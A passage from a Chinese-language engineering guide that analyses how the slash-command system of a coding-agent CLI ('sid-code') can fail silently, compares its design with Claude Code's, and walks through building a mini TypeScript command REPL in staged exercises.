4. `skillToCommand` 为什么要把整个原始 `skill` 定义挂在命令上？
   不挂会出现什么形态的 bug，为什么测试发现不了？
5. MCP 命令名为什么要带 `mcp__<server>__` 前缀？（三个作用）
6. `/reload-plugins` 漏了第一步清理会怎样？用户能发现吗？

---
<a id="s9"></a>
## §9 ★ 会「绿着坏掉」的失效模式

**这一章是本文最值钱的部分。** 前面八章讲的是"怎么做对"，
这一章讲的是"做错了但看不出来"——**所有这些失效的共同点是：不报错。**

编译过、测试绿、日志干净、功能"看起来"在用。而它是坏的。

### 9.1 形态一：类型定义在，能力没在用

**最典型的例子就是 §2.3 那个 `local-jsx`。**

```
读 types.ts   → 三种命令形态齐备 ✅
读 executor.ts → 三条执行路径都实现了 ✅
结论：「支持三种命令形态」
```

**这个结论是错的**，或者说它误导性极强——它会让读者以为交互式命令走
`local-jsx`。而实测：

```bash
$ grep -rn 'type: "local-jsx"' packages --include='*.ts' --include='*.tsx' | grep -v '\.test\.'
packages/core/src/command-contract/types.ts:291:  type: "local-jsx";     # ← 只有类型定义本身
```

**判据（三档，不是两档）**：

| 档 | 判据 | 该怎么描述 |
| --- | --- | --- |
| **有能力** | 有生产调用点，且能举出一条真实走这条路的命令 | 「支持 X」 |
| **有代码无调用** | 类型/实现在，生产调用点为 0 | 「预留了 X，当前未使用」 |
| **没有** | 连类型都没有 | 「不支持 X」 |

**中间那档最容易被记成第一档**，因为读代码时它和第一档长得一样。

**排查方法**：不要搜类型名，要搜**使用点**。而且要排除测试文件——
测试里一定有使用（否则测试写不出来），它证明的是"能用"而不是"在用"。

### 9.2 形态二：接线了，但接到了空壳上

比形态一更阴，因为它能骗过"有没有接线"这个检查。

```ts
// packages/cli/src/app.ts:8035（实读）
const executor = new CommandExecutor(cmdCtxNew, {
  setToolJSX: () => {
    /* 预留：当前 dialog 走 activeDialog state，无需 JSX 挂载 */
  },
});
```

**任何静态检查都会说"这里接线了"**。要发现它是空的，
必须读那个函数体。

**这个形态的通用形状**：

```
配置项填了       但填的是默认值
回调注册了       但函数体是空的
参数传了         但下游忽略了它
开关打开了       但开关控制的代码路径不可达
```

**排查方法**：对每个"已接线"的点，问"**如果我把这一处删掉，
有什么可观测的行为会变吗？**"答不上来就是空壳。

**这次的样本里注释是诚实的**（明说了"当前无真 local-jsx 命令"），
所以能发现。**但注释是最不可靠的证据**——它是写代码时的事实，
可能三个月前就过期了。⚠️ 我在这份文档里引用了很多源码注释作为证据，
这本身有风险：注释说的是当时的意图，不是现在的行为。
**凡是能用 grep 验证的，本文都验证了；纯注释的结论我标了"注释说"。**

### 9.3 形态三：一半接线了，另一半没有

§6.5 那个 `addInvokedSkill` 就是标准样本（注释原文）：

```
ctxMgr 侧保留机制早已接线，缺的一直是喂数据这一侧
```

```
┌──────────────────┐            ┌──────────────────┐
│ 喂数据的一侧      │  ✗ 缺失   │ 消费数据的一侧    │
│ addInvokedSkill() │ ────X────▶│ 压缩时保留 skill  │
│                   │           │ 指令（代码在！）  │
└──────────────────┘            └──────────────────┘
```

**症状**：用户 `/some-skill` → 聊很久 → 触发自动压缩 → 模型忘了 skill 的要求。

**为什么排查时容易误判**：你去看"压缩时保留 skill 指令"这个功能，
**代码在、逻辑对、甚至有单测**（单测会自己造数据喂进去，所以测试是绿的）。
你会得出"这个功能没问题"，然后去别处找原因。

**判据：对每个"生产者 → 消费者"的数据通路，两端都要有独立证据。**
消费者的单测证明不了生产者在喂数据——**单测通常自己造数据，
这恰好绕过了缺失的那一端。**

**这也解释了为什么单测全绿不能证明功能通**。要验证这类通路，
需要的是端到端的证据：真实跑一次，看消费端有没有拿到真实数据。

### 9.4 形态四：埋点漏了一条路径，数据偏低且偏得静默

§6.2 那个"埋在 `dispatch` 而非 `executeSlashCommand`"。

```
        executeSlashCommand()          executeImmediate()
        （正常路径）                     （插队路径，27/30 命令走这条）
                  │                          │
                  └────────────┬─────────────┘
                               ▼
     埋在这里 ✅            dispatch()          ← 两条都覆盖
     埋在上面 ❌ → 漏掉整条 immediate 路径
```

**为什么"静默"**：数据照样有、图照样画、没有任何异常。
只是 `/model` `/effort` 这些高频命令的调用量系统性偏低。
**你不会怀疑它，因为它看起来很正常。**

**判据：画出所有能到达目标动作的调用链，埋点放在它们的最后一个公共节点。**

**变异自证**（这是本仓反复强调的验证手法，这里给个具体做法）：
故意从 immediate 路径调一次，检查计数有没有 +1。
**如果没有变异测试，"埋点在"和"埋点覆盖全"这两件事你分不出来。**

### 9.5 形态五：只在成功路径上正确

§6.5 那个"权限 → hooks → 执行"的顺序。

```
成功路径：  权限通过 → 注册 hooks → 执行     ✅
           注册 hooks → 权限通过 → 执行     ✅  ← 顺序反了也对！

拒绝路径：  权限拒绝 → 不注册 → 返回        ✅
           注册 hooks → 权限拒绝 → 返回     ❌  ← hooks 留在系统里了
```

**两种顺序在成功路径上表现完全一致。** 而测试通常只测成功路径
（拒绝路径要构造权限规则，麻烦）。

**通用形态：副作用注册在校验之前。** 同类的还有：

```
先打开文件再检查权限     → 拒绝时文件句柄泄漏
先扣款再验证库存         → 失败时钱扣了货没有
先加进缓存再验证有效性   → 无效数据进了缓存
```

**判据：对每个"校验 + 副作用"的组合，问"如果校验失败，
副作用会不会已经发生了？"**

### 9.6 形态六：多层缓存，清了内层外层不动

§3.4 和 §8.6 各出现一次。**同一个系统里出现两次，说明这是结构性的。**

```
        清 B ✅
          │
          ▼
    ┌──────────┐        ┌──────────┐
    │ 缓存 A   │───X───▶│ 缓存 B   │
    │（外层）   │  不会走 │（内层）   │
    └──────────┘        └──────────┘
     A 命中自己的 key 就返回，永远到不了被清空的 B
```

**症状**：用户点了"刷新"，UI 显示"已刷新"，内容没变。

**为什么静默**：`clearCache()` 成功执行了、返回了、没有异常。
**"清缓存"这个动作本身没有失败——它只是清了不管用的那一层。**

两种对策，各有代价：

| 对策 | 做法 | 代价 |
| --- | --- | --- |
| **引用当 key** | 上层比较下层数据的引用（sid-code 的 `suggestions.ts`） | 要求下层必须重建对象，不能原地改 |
| **单一清理入口** | 把多层清理封成一个函数 | 要求所有调用方都走它，靠约定 |

sid-code 两种都用了：`suggestions.ts` 用引用，插件刷新用约定（§8.6 那个前置条件）。
**用约定的那处更脆弱**，第三个调用方出现时容易漏。

### 9.7 形态七：分母口径让真信号消失

§5.1 那个 `unknown_command`。注释里写死了分母：

```
分母提示：这条的分母是「用户敲下的斜杠命令总数」（≈ command_invoke + command_rejected），
用全量会话数当分母会把 unknown_command 率稀释到看不见。
```

```
                    分子相同，两个分母：

unknown_command / 全部会话数        = 0.3%   → 「没问题」→ 放弃这个信号 ❌
unknown_command / 全部斜杠命令数    = 12%    → 「用户在找的功能我们没有」✅
```

**同一份数据，一个让你放弃，一个让你行动。**

**为什么这叫"绿着坏掉"**：图表在、数据在、数字也算对了——
**错的是它回答的那个问题**。而没人会去质疑一个"算对了"的数字。

**判据：报一个比率时，分母必须和分子一起写死在文档/注释里。**
只写分子的指标，三个月后换个人看就会用错分母。

### 9.8 形态八：只把静默失败写进日志

§3.5 那个"降级为空数组 + `log.warn`"。

```ts
loadCustomCommands(cwd, scanOptions).catch((e) => {
  log.warn("COMMAND", `加载自定义命令失败: ${e?.message}`);
  return [];       // ← 降级
}),
```

降级是对的（不能因为一个坏文件让整个 agent 起不来）。**但 `log.warn`
不是给用户的出口**——它进日志文件，用户永远不会去看。

```
用户视角：我写的 /my-command 不见了
        → 「大概这个功能不支持吧」
        → 或者「我文件放错位置了？」反复检查目录
        → 永远想不到「去看 debug 日志」
```

**判据：静默降级必须有一个"用户会主动去看"的出口。**
`/doctor` 这类自检命令就是那个出口——它该汇总所有这类 warn。
**日志是排查工具，不是通知渠道。**

### 9.9 形态九：fail-open 和 fail-closed 混用

§8.3 末尾那个。同一个系统里，两处安全确认对"依赖缺失"的取向是相反的：

```ts
// custom.ts —— 回调没注入 → 跳过确认 → shell 直接执行（fail-OPEN）
if (ctx.confirmShellCommands) {
  const confirmed = await ctx.confirmShellCommands(commands);
  if (!confirmed) return { ... };
}
execSync(cmd, { ... });

// skill/executor.ts 的 resolveSkillAsk —— 三条兜底路径全部 return false（fail-CLOSED）
if (opts.confirm) { try { ... } catch { log.warn("...保守拒绝"); return false; } }
if (opts.checker) { try { ... } catch { log.warn("...保守拒绝"); return false; } }
log.warn("SKILL", `skill "${skill.name}" 需确认但无确认通道，拒绝执行`);
return false;
```

**注意这一条和前八条不同：它今天没有坏。** 我核实过生产路径上那个回调是注入的
（`app.ts:7966`）。所以它不是一个活的缺陷，而是一个**结构性隐患**——
正确性依赖"每一条现在和将来的路径都记得注入"。

**为什么它仍然属于"绿着坏掉"这一章**：两处代码各自读都很合理，
静态检查、测试、日志全都不会说话。问题只在**把两个文件放在一起看**时才显现——
**而没人会同时读这两个文件。** 这一条的失效形态不是"现在错了"，
是"下一个人加第三条路径时会错，而那时没有任何东西会拦他"。

**判据：整个系统对"安全依赖缺失"必须有统一的默认取向，而且必须是 fail-closed。**
`if (可选的安全检查) { 检查 }` 这个形状本身就是个警报——
它的语义是"有检查就检查，没有就放行"。

### 9.10 把九条压成五句话

1. **代码在 ≠ 能力在用。** 判据是生产调用点，不是类型定义。三档描述，别用两档。
2. **接线了 ≠ 接对了。** 问"删掉这一处，什么可观测行为会变"。
3. **一端在 ≠ 通路通。** 生产者和消费者要各自有独立证据；单测自己造数据，
   恰好绕过缺失的那端。
4. **有数据 ≠ 数据对。** 埋点要在所有路径的汇聚点；比率的分母要和分子一起写死。
5. **降级对 ≠ 处理完。** 静默失败要有用户会主动去看的出口；
   安全依赖缺失一律 fail-closed。

### 9.11 本章自检

1. 「支持三种命令形态」这句话，对 sid-code 而言错在哪？该怎么说？
2. 消费端的单测全绿，为什么证明不了这条数据通路是通的？
3. 「权限 → hooks」顺序反了，为什么测试发现不了？
4. 一个比率指标只写了分子没写分母，三个月后会发生什么？
5. `if (ctx.someSecurityCheck) { check() }` 这个形状为什么本身就是警报？

---
<a id="s10"></a>
## §10 两个实现横向对比：哪些是必然，哪些是选择

### 10.1 为什么要做这一节

单看一个实现，你分不清哪些是**这个领域的必然结构**、
哪些只是**这一家的选择**。面试里这个区别很致命：

```
把「必然」说成「我们的设计」  → 显得没见过别的实现
把「选择」说成「标准做法」    → 一问「为什么不用另一种」就答不上来
```

### 10.2 规模对照（先把量级摆清楚）

| | sid-code | Claude Code |
| --- | --- | --- |
| 命令系统代码量 | 8547 行（`packages/cli/src/command/` 33 个 `.ts`，实测） | — |
| 内置命令数 | ≈65（30 已迁移 + 35 legacy 桥接，实测） | 80+（CC 调研口径） |
| 命令来源数 | 6（内置/用户/项目/Skill/插件/MCP） | 7（多 bundled skills 与 workflow） |
| 最大单文件 | `builtins.ts` 1995 行 | `processSlashCommand.tsx` 922 行 |

**sid-code 处于一次未完成的迁移中**：新体系（`commands/` 目录，判别联合）
已有 30 条，旧体系（`builtins.ts` 里的 class + `execute()` 方法）还有 35 条，
靠 `adapter.ts`（249 行）双向桥接。

**这个"两套体系并存"本身是个值得学的现象**，见 §10.5。

### 10.3 重合的部分 = 这个领域的必然

这七条两边**完全一致**。它们不是抄的，是被同一批约束逼出来的：

| # | 结构 | 被什么逼出来的 |
| --- | --- | --- |
| 1 | **三种执行形态的判别联合** | 命令确实有三种完成语义（自己完成 / 等用户 / 交给模型） |
| 2 | **加载缓存 + 过滤每次重算** | 磁盘 IO 贵，运行时开关会变 |
| 3 | **数组顺序即优先级，外部覆盖内置** | 用户写了就是想用自己那条 |
| 4 | **`looksLikeCommand` 正则 + `stat()` 双判** | `/` 前缀和绝对路径天然歧义 |
| 5 | **MCP 在最外层合并** | 外部进程的连接状态不由我们控制 |
| 6 | **`local-jsx` 的 `doneWasCalled` 守卫** | callback→Promise 桥接必然有死锁面 |
| 7 | **模糊搜索 + 确定性排序两层** | 模糊负责召回，确定性负责精度 |

**面试里这七条该说成「这个问题的标准解」**，不是「我们的设计」。
能指出"两个独立实现收敛到同一结构"，比说"我们用了判别联合"更有说服力。

### 10.4 分叉的部分 = 真实的设计选择

五处分叉，每处都能问"为什么"：

#### ① 交互式命令：命令自带 UI vs 返回意图

已在 §2.3 详细展开。摘要：

| | CC：`local-jsx` | sid-code：`{type:"dialog"}` + 22 项枚举 |
| --- | --- | --- |
| 赌的是 | 交互式面板多且各不相同 | 对话框种类有限且集中 |
| 白拿的 | 加面板不动别处 | **不需要 §6.3 那套死锁防护** |
| 代价 | 需要那套防护；命令难单测 | 加面板改两处；界面自由度受限 |

**sid-code 这一处的选择带来了一个具体的收益**：§6.3 那个死锁在它的生产路径上
**不存在**（因为没有真 `local-jsx` 命令）。它保留了防护代码但没有暴露面。

#### ② 未知命令：报错 vs 按来源区分

| | 做法 |
| --- | --- |
| sid-code | 像命令名就报错，含 `/` 就 passthrough |
| CC | 再加一维：**看输入来源**。手机端来的未知命令 passthrough，本地终端报错 |

**CC 这一处更细，理由是它有多个输入入口**（本地终端 / 手机 / Web）。
sid-code 目前只有终端，加这一维是空的。**这又是一个"维度数量取决于产品形态"
的例子**（对照 §4.5 的 `availability`）。

#### ③ immediate 的限制方式：类型硬限 vs 命令声明

| | 做法 | 失效方向 |
| --- | --- | --- |
| CC | 只允许 `local-jsx` 型 | **保守失效**：误拦一个本来安全的 prompt 命令 |
| sid-code | 命令自己声明 `immediate: true` | **危险失效**：漏放一个标错了的命令 |

§5.2 说过我的判断：**两条都要**。类型做硬限（机械可查），
声明做细化（只在类型允许范围内）。sid-code 目前只有后者——
一条 `prompt` 型命令误标 `immediate: true` 没有任何东西会拦它。

#### ④ 身份门控：有 `availability` vs 没有

§4.5 讲过。**sid-code 没有是对的**（它没有多种账号身份），
加一个永远返回 true 的维度比不加更糟。

#### ⑤ 上下文对象的形态：一个契约 vs 一个巨型接口

这一处 sid-code 有个专门的设计，值得单独讲。它有**两个**上下文类型：

```
AppContext        —— 旧体系，60+ 成员的 cli 风味巨型接口
CommandContext    —— 新体系，住在 core 的精简契约
```

`command-contract/types.ts` 的头部注释解释了为什么必须分开（实读）：

```
⛔ 边界铁律：`Command` 与 `AppContext` 绝不下移到这里

旧体系的 `Command.execute(args, ctx: AppContext)` 依赖 `AppContext` —— 一个
**60+ 成员的 cli 风味巨型接口**，自身还指向 `ui/statusline`、`command/registry.ts` 等
cli 内部路径。把它拖进 core 会引入一长串新的 `core → cli` 越界。
```

**背景**：`core` 包里的 Skill 系统需要"把自己注册成一条斜杠命令"。
命令类型原来住在 `cli` 包，于是 `core → cli` 反向依赖。
解法是把**契约**下移到 core，但只下移"skill 真正用到的那个闭包"。

最漂亮的一手是那个 `UnifiedCommandRegistryContract`（实读）：

```ts
/**
 * **为什么是契约接口而不是直接引用 `UnifiedCommandRegistry`**：那个 class 住在
 * `command/unified-registry.ts`（cli），core 引用它就是越界。而 `CommandContext`
 * 属 core，又确实要携带这个注册表引用给 cli 侧命令用。
 *
 * 解法是在 core 声明一个**结构化契约**：cli 的 class 实例结构上满足它，
 * 赋值天然成立（TS 结构化类型），不需要 class 显式 implements。
 */
export interface UnifiedCommandRegistryContract {
  reloadPlugins(): Promise<number>;
  loadPlugins(): Promise<number>;
  invalidateSkillCommands(): void;
}
```

**只声明三个方法**，注释还写了"要用更多方法时在此补声明，
**不要**改回直接 import cli 的 class"。

**这是 TS 结构化类型系统的一个正确用法**：被依赖方声明它需要的**最小形状**，
依赖方的实现天然满足。这比"让 cli 的 class 去 implements core 的 interface"
更松——后者要求 cli 认识 core 的那个接口，前者连这个都不要求。

而且这条边界不靠人记（注释原文）：

```
越界数由 `scripts/pkg-boundary-scan.ts` 机械校验，不靠人记。
```

**「不靠人记」是关键。** 一条只写在注释里的架构边界，
半年内一定会被某个赶时间的 PR 突破。有机械校验才是真边界。

### 10.5 一个诚实的观察：sid-code 的迁移未完成

实测：新体系 30 条，旧体系 35 条，靠 249 行适配器桥接。
`adapter.ts` 自己的注释写着"最终移除本文件"。

**这个状态的代价是真实的，值得点出来**：

| 代价 | 具体形态 |
| --- | --- |
| 两套上下文 | `toAppContext()` 每次执行 legacy 命令时构造一个 60+ 字段的对象 |
| 两条 skill 用户路径 | §6.5 那个埋点要在**两处**都做（`SkillCommand.execute` + 新 executor） |
| 认知成本 | 新人加一条命令要先搞清"我该加在哪边" |

第二条是最贵的——**它已经导致过一次漏埋**（§6.5 那个注释就是在说这件事）。

**但"未完成的迁移"不等于设计错误。** 判断它的正确姿势是问：

```
❌ 「为什么不一次迁完」        —— 65 条命令一次全改，review 不可能做完
✅ 「有没有机械保证不会倒退」   —— 新命令必须加在新体系里，有东西拦吗？
```

我在源码里**没有找到**这样的机械门禁（没有 lint 规则或脚本禁止往
`builtins.ts` 加新 `registry.register`）。**这是一个真实的缺口**：
渐进迁移最大的风险不是慢，是**边迁边往旧体系加新东西**，
永远迁不完。

> **面试信号**：被问"你怎么看这个项目的技术债"时，
> 上面这个"渐进迁移需要一条防倒退的机械门禁"比抱怨"有两套体系"深一档。
> **能指出缺失的那条门禁，说明你理解渐进迁移的失败方式。**

### 10.6 如果让你重新设计，优先级怎么排

按"不做会痛多少"排序，不按"听起来重要"：

| 优先级 | 做什么 | 不做会怎样 |
| --- | --- | --- |
| **P0** | 判别联合 + 三种形态 | 加第四种形态时全仓静默漏改 |
| **P0** | `looksLikeCommand` + `stat` 双判 | `/var/log` 报「未知命令」 |
| **P0** | callback→Promise 的 `doneWasCalled` 全套守卫 | **整个输入系统死锁，无报错无堆栈** |
| **P1** | 加载缓存 / 过滤每次算 | 每次按键扫磁盘，或改了开关不生效 |
| **P1** | 队列三级优先级 | 用户输入被后台通知饿死 |
| **P1** | immediate 插队 | 模型跑两分钟期间什么都调不了 |
| **P1** | 埋点在汇聚点 + 分母写死 | 数据静默偏低，指标误导决策 |
| **P2** | 模糊搜索 + 确定性排序 | 命令找不到（体感差，但不坏） |
| **P2** | 使用频率衰减 | 排序不贴习惯（纯优化） |
| **P2** | 别名冲突确定性保留 | `/c` 的指向随加载顺序变（低频但难查） |
| **P3** | 中间位置补全 | 少一个便利功能 |

**P0 三条的共性：不做的后果是"坏了但看不出来"或"卡死"。**
P2/P3 的后果都是"能用但不爽"。

### 10.7 明确不该抄的

| 不该抄 | 理由 |
| --- | --- |
| 60+ 成员的 `AppContext` | 它是历史包袱，sid-code 自己在往 `CommandContext` 迁 |
| 两套并存的命令体系 | 迁移中间态，不是目标态 |
| `availability` 维度（如果你没有多种账号身份） | 永远返回 true 的维度是纯负担（§4.5） |
| 只靠注释约定的两层缓存清理顺序（§8.6） | 第三个调用方会漏；该封成单一入口 |
| `if (ctx.confirmShellCommands)` 这种可选安全检查（§9.9） | fail-open 的形状。生产路径注入了所以今天没坏，但正确性靠约定维持 |

### 10.8 本章自检

1. 七条重合的结构里，挑一条说清它"为什么必然"。
2. `UnifiedCommandRegistryContract` 只声明三个方法，这个"最小形状"的好处是什么？
   为什么比让 cli 的 class implements core 的接口更松？
3. 渐进迁移最大的风险不是慢，是什么？sid-code 缺了什么来防它？
4. P0 那三条的共同点是什么？

---
<a id="s11"></a>
## §12 动手：从零实现一个 mini 命令系统

**读懂和写出来是两件事。** 这一章给一条五阶段路线，每阶段都是**能跑的**，
而且每阶段都会让你**亲手撞到**前面章节讲的那个坑——撞过一次比读十遍管用。

建议用 TypeScript + Node/Bun，不需要任何框架。总工作量约三到四天。

### 阶段 1：能跑通一条命令（两小时）

**目标**：一个 REPL，能识别 `/help` 并执行。

```ts
// mini/index.ts
import * as readline from "node:readline/promises";

type Command = { name: string; description: string; run: (args: string) => string };

const commands: Command[] = [
  { name: "help", description: "显示帮助",
    run: () => commands.map((c) => `/${c.name} — ${c.description}`).join("\n") },
  { name: "echo", description: "回显参数", run: (args) => args || "(空)" },
];

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
for (;;) {
  const line = (await rl.question("> ")).trim();
  if (!line) continue;
  if (!line.startsWith("/")) { console.log(`[发给模型] ${line}`); continue; }
  const [name, ...rest] = line.slice(1).split(/\s+/);
  const cmd = commands.find((c) => c.name === name);
  console.log(cmd ? cmd.run(rest.join(" ")) : `未知命令: /${name}`);
}
```

**验收**：`/help` 有输出，`/echo hi` 回显 `hi`，普通文本走"发给模型"分支。

**这一阶段你已经有了 §0.2 那个朴素版本。** 后面四个阶段就是把它撑开。

---

### 阶段 2：撞第一个坑 —— 路径歧义（一小时）

**先制造问题**：在阶段 1 的程序里输入 `/var/log/syslog`。

你会得到 `未知命令: /var` ——**而用户想让模型看这个文件**。

**修它**（对应 §1.4）：

```ts
function looksLikeCommand(name: string): boolean {
  return /^[a-zA-Z0-9:\-_]+$/.test(name);
}
async function isFilePath(name: string): Promise<boolean> {
  try { await (await import("node:fs/promises")).stat(`/${name}`); return true; }
  catch { return false; }
}

// 主循环里替换查找失败的分支：
if (!cmd) {
  if (looksLikeCommand(name) && !(await isFilePath(name))) {
    console.log(`未知命令: /${name}`);
  } else {
    console.log(`[发给模型] ${line}`);      // ← passthrough
  }
  continue;
}
```

**验收三条**：
- `/var/log/syslog` → 走 passthrough ✅（含 `/`，正则不过）
- `/tmp` → 走 passthrough ✅（**正则过了，靠 `stat` 拦住的**，这条最关键）
- `/xyzabc` → 报未知命令 ✅

**故意去掉那个 `stat` 检查再试一次 `/tmp`**，看它变成"未知命令"。
这就是为什么一道正则不够。

---

### 阶段 3：三种形态，被迫做抽象（一天）

**这是最重要的一个阶段。** 加三条命令，每条逼出一种形态：

```
/cost    → 读个计数器返回文字         → local
/model   → 需要用户从列表里选一个      → 需要"等用户"的形态
/commit  → 需要模型理解 diff 写 message → 需要"交给模型"的形态
```

**先试着用阶段 1 那个 `run: (args) => string` 硬写 `/model`**。
你会卡在一个具体的地方：`run` 必须同步返回一个字符串，
**而用户还没选完**。返回什么？返回 `"请选择"`？那选完之后谁来收结果？

这个卡点就是判别联合的**动机**。撞到它之后再往下改：

```ts
type CommandBase = { name: string; description: string; aliases?: string[] };

type LocalResult =
  | { type: "text"; value: string }
  | { type: "dialog"; dialog: string }        // ← 阶段 3 先用 sid-code 那种「返回意图」
  | { type: "skip" };

type LocalCommand    = { type: "local";  run: (args: string) => Promise<LocalResult> };
type PromptCommand   = { type: "prompt"; context?: "inline" | "fork";
                         getPrompt: (args: string) => Promise<string> };
type UnifiedCommand  = CommandBase & (LocalCommand | PromptCommand);

// 执行引擎：注意不写 default（§6.1）
async function dispatch(cmd: UnifiedCommand, args: string) {
  switch (cmd.type) {
    case "local":  return handleLocal(await cmd.run(args));
    case "prompt": {
      const prompt = await cmd.getPrompt(args);
      console.log(cmd.context === "fork" ? `[子代理执行] ${prompt}` : `[注入对话] ${prompt}`);
      return;
    }
  }
}
```

**验收**：三条命令都能跑；`/model` 打印 `[打开对话框: model]`；
`/commit` 打印 `[注入对话] ...`。

**然后做这个实验**（这是本阶段的真正收获）：给 `UnifiedCommand` 加第四种形态

```ts
type LocalJSXCommand = { type: "local-jsx"; run: (onDone: (r: string) => void) => void };
type UnifiedCommand = CommandBase & (LocalCommand | PromptCommand | LocalJSXCommand);
```

**编译器立刻在 `dispatch` 报错**（返回类型不覆盖所有分支）。
这就是 §2.1 那个"白拿的好处"。

**再做反向实验**：把 `switch` 加上 `default: return;`，报错消失了——
**第四种形态会静默走进 default**。这是为什么 §6.1 刻意不写 default。

---

### 阶段 4：多来源与注册表（一天）

**目标**：支持从磁盘加载自定义命令，并撞上优先级和缓存两个坑。

**第一步，加载磁盘命令**（对应 §8.2）：

```ts
// ./mini-commands/greet.md
// ---
// description: 打个招呼
// ---
// 请用 $1 的风格跟我打招呼。

async function loadCustomCommands(dir: string): Promise<UnifiedCommand[]> {
  const fs = await import("node:fs/promises");
  const out: UnifiedCommand[] = [];
  let files: string[];
  try { files = await fs.readdir(dir); } catch { return []; }   // ← 目录不存在=正常
  for (const f of files.filter((f) => f.endsWith(".md"))) {
    const raw = await fs.readFile(`${dir}/${f}`, "utf-8");
    const name = f.replace(/\.md$/, "");
    const body = raw.replace(/^---[\s\S]*?---\n/, "");
    out.push({
      type: "prompt", name, description: `自定义: ${name}`,
      async getPrompt(args) {
        const parts = args.trim().split(/\s+/).filter(Boolean);
        return body
          .replace(/\$ARGUMENTS\b/g, args.trim())
          .replace(/\$(\d+)/g, (_, i) => parts[+i - 1] ?? "");   // ← 注意顺序（§8.2）
      },
    });
  }
  return out;
}
```

**第二步，撞优先级坑**：在 `mini-commands/` 里放一个 `cost.md`，
和内置的 `/cost` 同名。**现在谁生效？** 取决于你怎么拼数组——
这正是 §3.3 那个"数组顺序即优先级"。按判据实现：

```ts
class Registry {
  private cache = new Map<string, UnifiedCommand[]>();

  async loadAll(cwd: string): Promise<UnifiedCommand[]> {
    const hit = this.cache.get(cwd);
    if (hit) return hit;                                 // ← 贵的部分缓存（§3.2）

    const [custom, builtin] = await Promise.all([
      loadCustomCommands(`${cwd}/mini-commands`).catch(() => []),   // ← 失败隔离（§3.5）
      Promise.resolve(BUILTIN_COMMANDS),
    ]);
    const merged = this.dedupe([...custom, ...builtin]);  // ← 自定义在前 = 优先
    this.cache.set(cwd, merged);
    return merged;
  }

  async getCommands(cwd: string, dynamic: UnifiedCommand[] = []) {
    const all = await this.loadAll(cwd);
    const enabled = all.filter((c) => c.isEnabled?.() ?? true);   // ← 每次重算（§3.2）
    const names = new Set(enabled.map((c) => c.name));
    return [...enabled, ...dynamic.filter((d) => !names.has(d.name))];
  }

  private dedupe(cmds: UnifiedCommand[]): UnifiedCommand[] {
    const owner = new Map<string, string>();
    const out: UnifiedCommand[] = [];
    for (const c of cmds) {
      if (owner.has(c.name)) continue;                    // 同名：静默丢（§3.6）
      owner.set(c.name, c.name);
      for (const a of c.aliases ?? []) {
        const held = owner.get(a);
        if (held && held !== c.name) {
          console.warn(`别名冲突: /${a} 已被 "${held}" 占用，"${c.name}" 的该别名被忽略`);
          continue;                                       // 别名碰撞：warn + 保留先注册者
        }
        if (!held) owner.set(a, c.name);
      }
      out.push(c);
    }
    return out;
  }
}
```

**第三步，撞缓存坑**（这是本阶段最值钱的部分）：

1. 启动程序，跑 `/help`
2. **不重启**，往 `mini-commands/` 里加一个新 `.md`
3. 再跑 `/help` —— **新命令不在列表里**

这就是 §3.4 那个"缓存了之后怎么热更新"。加一条 `/reload` 命令调 `cache.clear()`。

**第四步，撞保护名单坑**：写一个 `exit.md` 覆盖 `/exit`，
然后**故意让它内容是错的**。现在你退不出程序了（只能 Ctrl+C）。
这就是 §3.3 那份 `PROTECTED_NAMES` 的动机。加上它。

---

### 阶段 5：调度与队列（一天）

**目标**：模拟"模型正在跑"的状态，撞上 §5 的三个坑。

```ts
type Queued = { value: string; priority: "now" | "next" | "later" };
const ORDER = { now: 0, next: 1, later: 2 };

class Queue {
  private q: Queued[] = [];
  enqueue(v: string, p: Queued["priority"] = "next") { this.q.push({ value: v, priority: p }); }
  enqueueNotification(v: string) { this.enqueue(v, "later"); }   // ← 默认值差异就是设计（§5.3）
  dequeue(): Queued | undefined {
    if (!this.q.length) return;
    let best = 0;
    for (let i = 1; i < this.q.length; i++)                       // ← O(n) 是对的（§5.3）
      if (ORDER[this.q[i].priority] < ORDER[this.q[best].priority]) best = i;
    return this.q.splice(best, 1)[0];
  }
  get size() { return this.q.length; }
}

async function handleInput(line: string, isModelActive: boolean, cmds: UnifiedCommand[]) {
  if (isModelActive && line.startsWith("/")) {
    const [name, ...rest] = line.slice(1).split(/\s+/);
    const cmd = findCommand(name, cmds);
    if (cmd?.immediate) { await dispatch(cmd, rest.join(" ")); return "immediate"; }
  }
  if (isModelActive) { queue.enqueue(line); return "enqueued"; }
  await runInput(line);
  return "executed";
}
```

**四个实验，逐个撞坑**：

**实验 A（§5.2 插队的必要性）**：加一条假的 `/slow-task` 模拟模型跑 10 秒。
在它跑的时候敲 `/model opus`。不标 `immediate` 时你要等 10 秒——
**而那个任务已经用旧模型跑完了**。标上 `immediate: true` 再试。

**实验 B（§5.2 插队的危险性）**：给 `/clear` 也标上 `immediate: true`，
在 `/slow-task` 跑的时候敲它。观察消息数组被清空**而慢任务还在往里写**。
这就是"会改动模型正在读写状态的命令不能插队"。**去掉那个标记。**

**实验 C（§5.3 优先级）**：模拟 5 条后台通知
（`queue.enqueueNotification("任务N完成")` ×5），然后立刻 `queue.enqueue("用户输入")`。
出队顺序应该是**用户输入优先**。把两个入口的默认优先级改成一样再试，
感受一下用户输入排在第 6 位是什么体验。

**实验 D（§5.4 那个容易漏的触发条件）**：让 `/model` 进入一个"等用户按键"的状态
（`await rl.question()`），同时队列里有东西。如果你的处理器只检查
"模型空闲 + 队列非空"，它会在你还在选模型时执行队列里的输入。
**加上第三个条件**：有交互式 UI 时不处理队列。

---

### 阶段 6（选做）：callback→Promise 与死锁（半天）

**只有做了这一阶段，你才真正理解 §6.3。**

把阶段 3 那个 `local-jsx` 形态真的实现出来：

```ts
function executeLocalJSX(cmd: LocalJSXCommand): Promise<string> {
  return new Promise((resolve) => {
    let doneWasCalled = false;
    const onDone = (r: string) => {
      if (doneWasCalled) return;
      doneWasCalled = true;
      resolve(r);
    };
    // ⚠️ 先不加 catch，故意留坑
    cmd.run(onDone);
  });
}
```

**三个实验，每个都让程序以不同方式卡死**：

1. **让 `cmd.run` 抛异常**。观察：程序卡住，**没有任何报错输出**，
   CPU 0%，Ctrl+C 才能退。这就是 §6.3 那个死锁。加 `.catch` 兜底。
2. **让 `cmd.run` 先调 `onDone` 再做别的事**（比如打印一个"界面"）。
   观察那个"界面"在命令已经完成之后才出现——没人会来关它。
3. **让 `cmd.run` 调两次 `onDone`**。有 `doneWasCalled` 守卫时第二次静默无效；
   去掉守卫，观察后续清理逻辑跑两遍。

**做完这三个实验，你就有了 Q13 那道题的第一手答案**——
而不是背来的。

---

### 阶段总览：你会亲手撞到的坑
